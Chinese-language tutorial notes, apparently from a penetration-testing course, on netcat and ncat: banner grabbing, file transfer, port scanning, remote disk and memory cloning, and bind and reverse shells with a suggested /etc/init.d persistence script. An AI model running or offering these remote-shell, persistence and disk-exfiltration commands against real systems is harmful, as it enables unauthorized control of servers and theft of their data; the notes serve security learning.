#### NC -- TELNET /BANNER
> * `nc -nv 1.1.1.1 80`, 
> 	* `-v`: 显示详细的输出内容. 
> 	* `-n`: 不进行DNS解析,后跟ip地址 
> * POP3, 端口110, 
> 	* 通过`ping pop3.163.com`获得ip地址, 进一步使用nc(需要base64编码)
> * SMTP, 端口25
> * `nc -l -p 3333`,
> 	* `-l`开启监听模式, 
> 	* `-p`指定相应端口,
> 	* `netstat -pantu | grep port`查看相应端口服务是否开启
> * 远程电子取证信息收集:
> 	* `ps aux | nc -nv 172.16.203.132 3333 -q 1`,获取进程信息并通过nc传输, 
> 	* `nc -l -p 3333 > ps.txt`, 输出重定向. 
> 	* `-q 1`是在输入完成1s后结束连接. 
> 	* `lsof`指令获取所有打开文件的信息

#### NC -- 文件传输/目录

> * 文件传输
> 	* A(作为文件接收端): `nc -lp 333 > 1.mp4`
> 	* B(作为文件发送端): `nc -nv 1.1.1.1 333 < 1.mp4 -q 1`
> 	* 或
> 	* A(作为文件发送端): `nc -q 1 -lp 333 < a.mp4`
> 	* B(作为文件接受端): `nc -nv 1.1.1.1 333 > b.mp4`
> * 传输目录(先打包,在传送)
> 	* A: `tar -cvf - ./burpsuitePro | nc -lp 3333 -q 1`
> 	* B: `nc 172.16.203.132 3333 | tar -xvf -`

#### NC -- 流媒体服务
> * A: `cat 1.mp4 | nc -lp 333 `
> * B: `nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -`

#### NC -- 端口扫描

> * `nc -nvz 1.1.1.1 1-65535`, 以TCP的方式进行扫描
> * `nc -nvzu 1.1.1.1 1-1024`, 以UDP的方式进行扫描

#### NC -- 远程克隆硬盘

> * 远程电子取证,可以将目标服务器硬盘远程复制,或者内存(/dev/mem , /dev/kmem)
> * A: `nc -lp 333 | dd of=/dev/sda`,of即outputfile, sda即硬盘数据,若有两块盘即sdb
> * B: `dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1`

#### NC -- 远程控制

> * 正向:
> 	* A: `nc -lp 3333 -c bash`
> 	* B: `nv 1.1.1.1 3333`
> * 反向:
> 	* A: `nc -lp 3333`
> 	* B: `nc 1.1.1.1 333 -c bash`
> 	* 当从外向内的流量被拦截时, 可以使用反向的方法, 在目标服务器上添加启动脚本进行连接(/etc/init.d).
> * windows 用户把 bash 改成 cmd

#### NC -- NCAT

> * NC缺乏加密和身份验证的能力
> * 不同系统 / 平台的nc参数不尽相同
> * Ncat 包含于 nmap 工具包中
> 	* A: `ncat -c bash --allow 172.16.203.1 -vnl 333 --ssl`
> 	* B: `ncat -nv 1.1.1.1 333 -ssl`






